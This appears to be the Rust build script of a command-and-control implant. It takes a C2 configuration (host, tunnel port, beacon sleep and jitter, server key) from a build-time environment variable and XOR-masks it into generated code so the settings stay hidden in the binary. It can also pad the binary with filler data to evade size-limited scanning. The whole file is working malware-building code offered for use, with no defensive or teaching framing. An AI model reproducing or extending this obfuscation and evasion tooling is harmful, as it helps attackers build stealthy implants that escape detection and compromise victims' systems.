use std::env;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();

    // 1. Get Configuration from Environment Variable (Injected by builder)
    // If missing (e.g. IDE checks), use a safe default.
    let config_json = env::var("C2_BUILD_CONFIG").unwrap_or_else(|_| {
        r#"{
            "transport": "tls",
            "c2_host": "127.0.0.1",
            "tunnel_port": 4443,
            "sleep_interval": 5,
            "jitter_percent": 10,
            "bloat_mb": 0,
            "debug": true,
            "server_public_key": "DEV_KEY_PLACEHOLDER",
            "hash_salt": "DEV_SALT",
            "build_id": "DEV_BUILD"
        }"#.to_string()
    });

    // 2. Extract Bloat Size (Simple string parsing to avoid extra build-deps)
    let bloat_mb: usize = config_json
        .split("\"bloat_mb\":")
        .nth(1)
        .and_then(|s| s.split_terminator(&[',', '}'][..]).next())
        .and_then(|s| s.trim().parse::<usize>().ok())
        .unwrap_or(0);

    // 3. Obfuscate Configuration
    let config_bytes = config_json.as_bytes();
    let mut padded = config_bytes.to_vec();
    while padded.len() % 8 != 0 { padded.push(b' '); }
    
    let mask: u64 = 0xAA55_AA55_AA55_AA55;
    let mut numbers = Vec::new();
    
    for chunk in padded.chunks(8) {
        let mut bytes = [0u8; 8];
        bytes.copy_from_slice(chunk);
        numbers.push(u64::from_le_bytes(bytes) ^ mask);
    }

    // 4. Write 'obfuscated_config.rs'
    let config_dest_path = Path::new(&out_dir).join("obfuscated_config.rs");
    let mut conf_code = String::new();
    conf_code.push_str("pub fn get_config() -> String {\n");
    conf_code.push_str(&format!("    let mask: u64 = {};\n", mask));
    conf_code.push_str(&format!("    let chunks: [u64; {}] = [\n", numbers.len()));
    for num in numbers { conf_code.push_str(&format!("        {},\n", num)); }
    conf_code.push_str("    ];\n");
    conf_code.push_str("    let mut bytes = Vec::with_capacity(chunks.len() * 8);\n");
    conf_code.push_str("    for chunk in chunks {\n");
    conf_code.push_str("        let val = chunk ^ mask;\n");
    conf_code.push_str("        bytes.extend_from_slice(&val.to_le_bytes());\n");
    conf_code.push_str("    }\n");
    conf_code.push_str("    String::from_utf8(bytes).unwrap_or_default()\n");
    conf_code.push_str("}\n");
    fs::write(&config_dest_path, conf_code).expect("Failed to write config artifact");

    // 5. Generate Bloat Data (Optimization: Only if size > 0)
    let bloat_rs_path = Path::new(&out_dir).join("bloat_data.rs");
    let mut rs_code = String::new();

    if bloat_mb > 0 {
        let bloat_txt_path = Path::new(&out_dir).join("bloat.txt");
        let target_bytes = bloat_mb * 1024 * 1024;
        
        let file = File::create(&bloat_txt_path).expect("Failed to create bloat.txt");
        let mut writer = BufWriter::new(file);
        
        let mut current_bytes = 0;
        let chunk = [0u8; 1024]; 

        while current_bytes < target_bytes {
            writer.write_all(&chunk).unwrap();
            current_bytes += 1024;
        }
        writer.flush().unwrap();

        rs_code.push_str("pub const BENIGN_DATA: &str = include_str!(concat!(env!(\"OUT_DIR\"), \"/bloat.txt\"));\n");
        rs_code.push_str("pub fn use_bloat() {\n");
        rs_code.push_str("    if !BENIGN_DATA.is_empty() {\n");
        rs_code.push_str("        unsafe { std::ptr::read_volatile(&BENIGN_DATA.as_bytes()[BENIGN_DATA.len() - 1]); }\n");
        rs_code.push_str("    }\n");
        rs_code.push_str("}\n");
    } else {
        rs_code.push_str("pub fn use_bloat() { /* No bloat requested */ }\n");
    }
    
    fs::write(&bloat_rs_path, rs_code).expect("Failed to write bloat artifact");
    
    // Critical: Re-run build script if this specific ENV var changes
    println!("cargo:rerun-if-env-changed=C2_BUILD_CONFIG");
}
